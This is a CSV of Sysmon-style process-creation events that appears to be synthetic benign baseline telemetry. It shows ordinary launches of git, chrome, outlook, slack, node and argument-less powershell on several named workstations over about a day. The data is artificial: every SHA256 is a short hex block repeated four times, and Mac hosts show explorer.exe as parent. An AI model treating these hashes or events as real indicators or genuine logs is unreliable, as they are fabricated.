UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes
2026-03-10 19:21:23.641,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=0013fa16ace48abd0013fa16ace48abd0013fa16ace48abd0013fa16ace48abd
2026-03-10 19:31:49.558,MAC-DEV-04,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e84f6b12cb6f3001e84f6b12cb6f3001e84f6b12cb6f3001e84f6b12cb6f3
2026-03-10 19:36:57.481,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006154326394e8f0006154326394e8f0006154326394e8f0006154326394e8f
2026-03-10 19:50:22.916,FIN-WS31,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000ec147062e4794000ec147062e4794000ec147062e4794000ec147062e4794
2026-03-10 19:55:31.279,BLD-RUN-02,t.owens,1,git,"git",explorer.exe,,,SHA256=00200d7b474fbcfe00200d7b474fbcfe00200d7b474fbcfe00200d7b474fbcfe
2026-03-10 20:03:31.390,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0003d7ccd911f1200003d7ccd911f1200003d7ccd911f1200003d7ccd911f120
2026-03-10 20:16:52.689,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=000fe991f3a85938000fe991f3a85938000fe991f3a85938000fe991f3a85938
2026-03-10 20:27:16.632,BLD-RUN-02,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000ac05a4af8628b000ac05a4af8628b000ac05a4af8628b000ac05a4af8628b
2026-03-10 20:31:16.344,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=0013857fc193648c0013857fc193648c0013857fc193648c0013857fc193648c
2026-03-10 20:44:04.371,MAC-DEV-04,n.byrd,1,git,"git",explorer.exe,,,SHA256=002175105dc341e4002175105dc341e4002175105dc341e4002175105dc341e4
2026-03-10 20:57:59.339,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=001a7ca56b0b66a4001a7ca56b0b66a4001a7ca56b0b66a4001a7ca56b0b66a4
2026-03-10 21:02:02.955,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001c9389d3460d83001c9389d3460d83001c9389d3460d83001c9389d3460d83
2026-03-10 21:07:03.689,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000d635a66ebc629000d635a66ebc629000d635a66ebc629000d635a66ebc629
2026-03-10 21:13:18.783,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0007dac7db828e560007dac7db828e560007dac7db828e560007dac7db828e56
2026-03-10 21:18:41.927,MAC-DEV-04,e.park,1,git,"git",explorer.exe,,,SHA256=0008922abc171c770008922abc171c770008922abc171c770008922abc171c77
2026-03-10 21:32:29.208,FIN-WS31,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00058a96bd5f317700058a96bd5f317700058a96bd5f317700058a96bd5f3177
2026-03-10 21:39:34.219,FIN-WS31,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0012e7ecd022dcb80012e7ecd022dcb80012e7ecd022dcb80012e7ecd022dcb8
2026-03-10 21:44:45.105,MAC-DEV-17,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001cd9375b5bcfac001cd9375b5bcfac001cd9375b5bcfac001cd9375b5bcfac
2026-03-10 21:52:06.102,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00013b2991bc6db100013b2991bc6db100013b2991bc6db100013b2991bc6db1
2026-03-10 21:56:46.136,BLD-RUN-02,t.owens,1,node,"node",explorer.exe,,,SHA256=0015dbf974d68b8b0015dbf974d68b8b0015dbf974d68b8b0015dbf974d68b8b
2026-03-10 22:07:44.074,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000af70b025646fe000af70b025646fe000af70b025646fe000af70b025646fe
2026-03-10 22:14:25.560,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=00169b873ec5935900169b873ec5935900169b873ec5935900169b873ec59359
2026-03-10 22:19:30.459,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00143a384786cd9200143a384786cd9200143a384786cd9200143a384786cd92
2026-03-10 22:30:51.951,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=001bc86caaa249d8001bc86caaa249d8001bc86caaa249d8001bc86caaa249d8
2026-03-10 22:45:38.011,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0011a35fa58ce0ae0011a35fa58ce0ae0011a35fa58ce0ae0011a35fa58ce0ae
2026-03-10 22:59:46.198,MAC-DEV-04,n.byrd,1,git,"git",explorer.exe,,,SHA256=0011b0b845deb1940011b0b845deb1940011b0b845deb1940011b0b845deb194
2026-03-10 23:08:47.368,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=0002a927078617bb0002a927078617bb0002a927078617bb0002a927078617bb
2026-03-10 23:15:57.368,BLD-RUN-02,m.sato,1,node,"node",explorer.exe,,,SHA256=001d4d02fc238088001d4d02fc238088001d4d02fc238088001d4d02fc238088
2026-03-10 23:28:55.425,MAC-DEV-04,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003c89750daeaa20003c89750daeaa20003c89750daeaa20003c89750daeaa2
2026-03-10 23:36:04.189,MAC-DEV-04,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00122949ec760e0100122949ec760e0100122949ec760e0100122949ec760e01
2026-03-10 23:46:18.798,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000197ec39093196000197ec39093196000197ec39093196000197ec39093196
2026-03-10 23:59:03.833,FIN-WS22,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00026b09f8eaeb2800026b09f8eaeb2800026b09f8eaeb2800026b09f8eaeb28
2026-03-11 00:08:42.445,FIN-WS31,l.chen,1,git,"git",explorer.exe,,,SHA256=00158d1cb098e66d00158d1cb098e66d00158d1cb098e66d00158d1cb098e66d
2026-03-11 00:18:20.022,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000778529ae676a8000778529ae676a8000778529ae676a8000778529ae676a8
2026-03-11 00:30:28.040,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=0000979eca46a8fa0000979eca46a8fa0000979eca46a8fa0000979eca46a8fa
2026-03-11 00:36:22.106,BLD-RUN-02,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0016daecaa9bae3c0016daecaa9bae3c0016daecaa9bae3c0016daecaa9bae3c
2026-03-11 00:47:58.532,FIN-WS22,a.velasquez,1,node,"node",explorer.exe,,,SHA256=00022f105ec2891000022f105ec2891000022f105ec2891000022f105ec28910
2026-03-11 00:52:39.281,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017b26c57eff52c0017b26c57eff52c0017b26c57eff52c0017b26c57eff52c
2026-03-11 01:02:03.296,BLD-RUN-02,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006001f3224d40a0006001f3224d40a0006001f3224d40a0006001f3224d40a
2026-03-11 01:14:53.418,FIN-WS22,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000589a8d5de0d0e000589a8d5de0d0e000589a8d5de0d0e000589a8d5de0d0e
2026-03-11 01:21:01.039,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001cfeb7c76c690a001cfeb7c76c690a001cfeb7c76c690a001cfeb7c76c690a
2026-03-11 01:33:23.719,FIN-WS31,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006f5f4366126390006f5f4366126390006f5f4366126390006f5f436612639
2026-03-11 01:38:04.062,FIN-WS22,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0011d0638aa5365d0011d0638aa5365d0011d0638aa5365d0011d0638aa5365d
2026-03-11 01:46:30.366,FIN-WS31,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001453d1fc7047cb001453d1fc7047cb001453d1fc7047cb001453d1fc7047cb
2026-03-11 02:01:26.150,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0015d3377c794b950015d3377c794b950015d3377c794b950015d3377c794b95
2026-03-11 02:14:46.280,FIN-WS31,l.chen,1,node,"node",explorer.exe,,,SHA256=0010d7843f2c6b3c0010d7843f2c6b3c0010d7843f2c6b3c0010d7843f2c6b3c
2026-03-11 02:26:36.240,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015d34c4cb62f620015d34c4cb62f620015d34c4cb62f620015d34c4cb62f62
2026-03-11 02:38:29.745,MAC-DEV-04,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001bb207931815ce001bb207931815ce001bb207931815ce001bb207931815ce
2026-03-11 02:45:39.647,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000a5dd37827352d000a5dd37827352d000a5dd37827352d000a5dd37827352d
2026-03-11 02:49:39.783,MAC-DEV-17,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0005796abe4d0a580005796abe4d0a580005796abe4d0a580005796abe4d0a58
2026-03-11 02:59:56.914,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000c78da131a3603000c78da131a3603000c78da131a3603000c78da131a3603
2026-03-11 03:11:04.501,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00128d52ab63703d00128d52ab63703d00128d52ab63703d00128d52ab63703d
2026-03-11 03:20:05.937,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000f79e7c8ffa154000f79e7c8ffa154000f79e7c8ffa154000f79e7c8ffa154
2026-03-11 03:24:43.940,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000a9d20f93f9096000a9d20f93f9096000a9d20f93f9096000a9d20f93f9096
2026-03-11 03:34:04.737,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001d2e66f643258a001d2e66f643258a001d2e66f643258a001d2e66f643258a
2026-03-11 03:46:36.988,BLD-RUN-02,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0017a8e327aca0d40017a8e327aca0d40017a8e327aca0d40017a8e327aca0d4
2026-03-11 03:53:18.776,BLD-RUN-02,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0017165ca38f85930017165ca38f85930017165ca38f85930017165ca38f8593
2026-03-11 04:05:10.404,FIN-WS22,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00079fefdd130a5e00079fefdd130a5e00079fefdd130a5e00079fefdd130a5e
2026-03-11 04:18:06.857,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00143f86802b5fc300143f86802b5fc300143f86802b5fc300143f86802b5fc3
2026-03-11 04:29:30.729,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00235f8827d5c90000235f8827d5c90000235f8827d5c90000235f8827d5c900
2026-03-11 04:39:52.135,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=000b4ee0e5ed03c2000b4ee0e5ed03c2000b4ee0e5ed03c2000b4ee0e5ed03c2
2026-03-11 04:50:40.532,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00123daa64aee62500123daa64aee62500123daa64aee62500123daa64aee625
2026-03-11 05:04:28.325,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00202eea1e79c86200202eea1e79c86200202eea1e79c86200202eea1e79c862
2026-03-11 05:09:52.851,FIN-WS22,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=002370c5b824552e002370c5b824552e002370c5b824552e002370c5b824552e
2026-03-11 05:23:44.634,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=00002cf2b500ef8a00002cf2b500ef8a00002cf2b500ef8a00002cf2b500ef8a
2026-03-11 05:32:25.548,FIN-WS22,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001105b8fb3b9566001105b8fb3b9566001105b8fb3b9566001105b8fb3b9566
2026-03-11 05:37:44.921,MAC-DEV-17,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00176c31bd8bdda500176c31bd8bdda500176c31bd8bdda500176c31bd8bdda5
2026-03-11 05:46:34.400,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000bbca079cc1063000bbca079cc1063000bbca079cc1063000bbca079cc1063
2026-03-11 05:54:25.993,MAC-DEV-04,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001f5c9597f88b2a001f5c9597f88b2a001f5c9597f88b2a001f5c9597f88b2a
2026-03-11 06:01:13.800,MAC-DEV-17,r.kapoor,1,git,"git",explorer.exe,,,SHA256=00027035c4e33fd400027035c4e33fd400027035c4e33fd400027035c4e33fd4
2026-03-11 06:15:35.337,MAC-DEV-17,t.owens,1,git,"git",explorer.exe,,,SHA256=001f432e4919723b001f432e4919723b001f432e4919723b001f432e4919723b
2026-03-11 06:19:10.712,FIN-WS22,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002151b0c76ecc0e002151b0c76ecc0e002151b0c76ecc0e002151b0c76ecc0e
2026-03-11 06:34:08.933,MAC-DEV-04,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001d894481f51f78001d894481f51f78001d894481f51f78001d894481f51f78
2026-03-11 06:45:04.792,MAC-DEV-17,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00046c7ce83f1cd000046c7ce83f1cd000046c7ce83f1cd000046c7ce83f1cd0
2026-03-11 06:50:03.648,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0008acf6f4edcc660008acf6f4edcc660008acf6f4edcc660008acf6f4edcc66
2026-03-11 06:56:59.024,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0000387bc6f8d01c0000387bc6f8d01c0000387bc6f8d01c0000387bc6f8d01c
2026-03-11 07:07:44.953,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00035aacf28d532900035aacf28d532900035aacf28d532900035aacf28d5329
2026-03-11 07:22:44.677,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=00164dff2d3c471800164dff2d3c471800164dff2d3c471800164dff2d3c4718
2026-03-11 07:33:18.021,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000694eb62c82e5e000694eb62c82e5e000694eb62c82e5e000694eb62c82e5e
2026-03-11 07:39:05.527,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=0007c9d79d17874c0007c9d79d17874c0007c9d79d17874c0007c9d79d17874c
2026-03-11 07:44:17.448,FIN-WS22,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016a10648c765540016a10648c765540016a10648c765540016a10648c76554
2026-03-11 07:48:12.912,FIN-WS22,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000272b931761ec0000272b931761ec0000272b931761ec0000272b931761ec0
2026-03-11 08:02:26.584,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0000768a4fff0bf80000768a4fff0bf80000768a4fff0bf80000768a4fff0bf8
2026-03-11 08:06:09.038,FIN-WS31,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00008340a2381bc300008340a2381bc300008340a2381bc300008340a2381bc3
2026-03-11 08:16:20.574,BLD-RUN-02,l.chen,1,git,"git",explorer.exe,,,SHA256=001518ae6bf4af33001518ae6bf4af33001518ae6bf4af33001518ae6bf4af33
2026-03-11 08:29:04.743,FIN-WS31,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000967607db58d64000967607db58d64000967607db58d64000967607db58d64
2026-03-11 08:42:06.407,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=001322bda8177187001322bda8177187001322bda8177187001322bda8177187
2026-03-11 08:50:23.476,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001c2fd662b5f7e2001c2fd662b5f7e2001c2fd662b5f7e2001c2fd662b5f7e2
2026-03-11 08:56:27.320,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=000ff6a61616112b000ff6a61616112b000ff6a61616112b000ff6a61616112b
2026-03-11 09:02:09.222,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=00071d31395fc09d00071d31395fc09d00071d31395fc09d00071d31395fc09d
2026-03-11 09:09:56.523,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002270c69dd06000002270c69dd06000002270c69dd06000002270c69dd06000
2026-03-11 09:16:56.339,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=000a460e208d5f55000a460e208d5f55000a460e208d5f55000a460e208d5f55
2026-03-11 09:27:25.216,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001dd039807c2f0d001dd039807c2f0d001dd039807c2f0d001dd039807c2f0d
2026-03-11 09:41:57.438,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0019af006b352eb30019af006b352eb30019af006b352eb30019af006b352eb3
2026-03-11 09:54:00.926,BLD-RUN-02,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003355061ac22620003355061ac22620003355061ac22620003355061ac2262
2026-03-11 09:59:35.361,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001355c4ea51946e001355c4ea51946e001355c4ea51946e001355c4ea51946e
2026-03-11 10:08:13.110,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=0004146308629f9c0004146308629f9c0004146308629f9c0004146308629f9c
2026-03-11 10:13:50.652,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=0005f12cfd07f9930005f12cfd07f9930005f12cfd07f9930005f12cfd07f993
2026-03-11 10:22:02.495,FIN-WS31,t.owens,1,git,"git",explorer.exe,,,SHA256=0023688f6be5e0560023688f6be5e0560023688f6be5e0560023688f6be5e056
2026-03-11 10:36:30.546,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00072a38359b3db200072a38359b3db200072a38359b3db200072a38359b3db2
2026-03-11 10:46:47.466,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=00022f31fd35735000022f31fd35735000022f31fd35735000022f31fd357350
2026-03-11 10:51:53.020,FIN-WS31,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000878b55a680402000878b55a680402000878b55a680402000878b55a680402
2026-03-11 11:01:43.771,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=001fc904101ff215001fc904101ff215001fc904101ff215001fc904101ff215
2026-03-11 11:05:33.755,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00023f08488effb300023f08488effb300023f08488effb300023f08488effb3
2026-03-11 11:16:01.604,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000e8eb82d04b65c000e8eb82d04b65c000e8eb82d04b65c000e8eb82d04b65c
2026-03-11 11:21:48.593,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001a0aa0384a4d11001a0aa0384a4d11001a0aa0384a4d11001a0aa0384a4d11
2026-03-11 11:30:45.517,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001a1a64cffcb989001a1a64cffcb989001a1a64cffcb989001a1a64cffcb989
2026-03-11 11:37:13.037,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000426d816997f20000426d816997f20000426d816997f20000426d816997f20
2026-03-11 11:42:36.325,MAC-DEV-04,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000123c7867ed1ed000123c7867ed1ed000123c7867ed1ed000123c7867ed1ed
2026-03-11 11:53:37.281,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0020d592b60865d20020d592b60865d20020d592b60865d20020d592b60865d2
2026-03-11 12:02:09.023,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0018a2995ebf04b60018a2995ebf04b60018a2995ebf04b60018a2995ebf04b6
2026-03-11 12:13:13.902,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0011500da8103f190011500da8103f190011500da8103f190011500da8103f19
2026-03-11 12:27:35.368,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=002241b02924f0b4002241b02924f0b4002241b02924f0b4002241b02924f0b4
2026-03-11 12:36:39.475,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=00188b7dba2c154c00188b7dba2c154c00188b7dba2c154c00188b7dba2c154c
2026-03-11 12:46:03.072,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001b589d06f43d59001b589d06f43d59001b589d06f43d59001b589d06f43d59
2026-03-11 12:57:34.709,FIN-WS31,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000071f475040fc5000071f475040fc5000071f475040fc5000071f475040fc5
2026-03-11 13:10:54.126,FIN-WS22,e.park,1,node,"node",explorer.exe,,,SHA256=0016d5810b11caa40016d5810b11caa40016d5810b11caa40016d5810b11caa4
2026-03-11 13:22:14.002,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00197cb7a7f17eab00197cb7a7f17eab00197cb7a7f17eab00197cb7a7f17eab
2026-03-11 13:36:11.511,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=0000663c6580e9cf0000663c6580e9cf0000663c6580e9cf0000663c6580e9cf
2026-03-11 13:40:18.363,FIN-WS31,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000e2f81d4100128000e2f81d4100128000e2f81d4100128000e2f81d4100128
2026-03-11 13:53:05.054,FIN-WS31,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002379c2bd067bfe002379c2bd067bfe002379c2bd067bfe002379c2bd067bfe
2026-03-11 14:07:09.110,FIN-WS22,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000c30a1b6995dba000c30a1b6995dba000c30a1b6995dba000c30a1b6995dba
2026-03-11 14:12:32.364,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=0004d2bc4664433a0004d2bc4664433a0004d2bc4664433a0004d2bc4664433a
2026-03-11 14:17:17.510,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0005b7fdbfc80e310005b7fdbfc80e310005b7fdbfc80e310005b7fdbfc80e31
2026-03-11 14:28:58.225,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000a97b6f0e24b8b000a97b6f0e24b8b000a97b6f0e24b8b000a97b6f0e24b8b
2026-03-11 14:39:41.169,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001f983abd5e2d94001f983abd5e2d94001f983abd5e2d94001f983abd5e2d94
2026-03-11 14:46:54.433,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00140a35c024e4e200140a35c024e4e200140a35c024e4e200140a35c024e4e2
2026-03-11 14:51:05.416,MAC-DEV-17,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001c178b6800f411001c178b6800f411001c178b6800f411001c178b6800f411
2026-03-11 14:57:10.453,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001efa57421d842b001efa57421d842b001efa57421d842b001efa57421d842b
2026-03-11 15:01:50.774,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=00133fe848394d9700133fe848394d9700133fe848394d9700133fe848394d97
2026-03-11 15:09:32.305,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000499b47fe4d8d8000499b47fe4d8d8000499b47fe4d8d8000499b47fe4d8d8
2026-03-11 15:20:19.713,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001f04c71babe9d2001f04c71babe9d2001f04c71babe9d2001f04c71babe9d2
2026-03-11 15:26:31.427,MAC-DEV-04,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00044e898c0dc58d00044e898c0dc58d00044e898c0dc58d00044e898c0dc58d
2026-03-11 15:38:00.934,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=00042cbbcd76789b00042cbbcd76789b00042cbbcd76789b00042cbbcd76789b
2026-03-11 15:41:55.725,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0022cef018f785e00022cef018f785e00022cef018f785e00022cef018f785e0
2026-03-11 15:51:21.207,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=000319fbc89f2c25000319fbc89f2c25000319fbc89f2c25000319fbc89f2c25
2026-03-11 15:57:50.301,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=000fc62264ee703f000fc62264ee703f000fc62264ee703f000fc62264ee703f
2026-03-11 16:04:17.044,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000a6447719d2264000a6447719d2264000a6447719d2264000a6447719d2264
2026-03-11 16:08:24.255,FIN-WS22,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000f86bd693a428d000f86bd693a428d000f86bd693a428d000f86bd693a428d
2026-03-11 16:12:04.933,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000ad709a331917d000ad709a331917d000ad709a331917d000ad709a331917d
2026-03-11 16:24:41.162,MAC-DEV-17,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=002279e9128f10e8002279e9128f10e8002279e9128f10e8002279e9128f10e8
2026-03-11 16:29:03.319,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000449490c048f53000449490c048f53000449490c048f53000449490c048f53
2026-03-11 16:38:13.170,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001d88bcf48c91af001d88bcf48c91af001d88bcf48c91af001d88bcf48c91af
2026-03-11 16:50:15.640,BLD-RUN-02,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0008695a11489a5c0008695a11489a5c0008695a11489a5c0008695a11489a5c
2026-03-11 16:54:00.830,MAC-DEV-04,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0008d30db93beed30008d30db93beed30008d30db93beed30008d30db93beed3
2026-03-11 16:59:45.380,BLD-RUN-02,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020af801bd1ba640020af801bd1ba640020af801bd1ba640020af801bd1ba64
2026-03-11 17:09:11.515,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=00145f1476324bed00145f1476324bed00145f1476324bed00145f1476324bed
